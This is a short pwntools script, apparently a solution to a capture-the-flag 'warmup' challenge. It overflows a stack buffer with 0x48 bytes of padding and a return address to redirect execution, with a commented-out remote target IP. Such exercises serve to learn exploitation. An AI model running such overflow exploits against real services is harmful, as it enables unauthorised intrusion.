from pwn import *
context.log_level = "Debug"
#io = remote("114.55.66.54", 10001)
io = process("./warmup")
gdb.attach(io)
payload = "A" * 0x48
payload += p64(0x40060d)
io.sendlineafter(">", payload)
io.recvall()
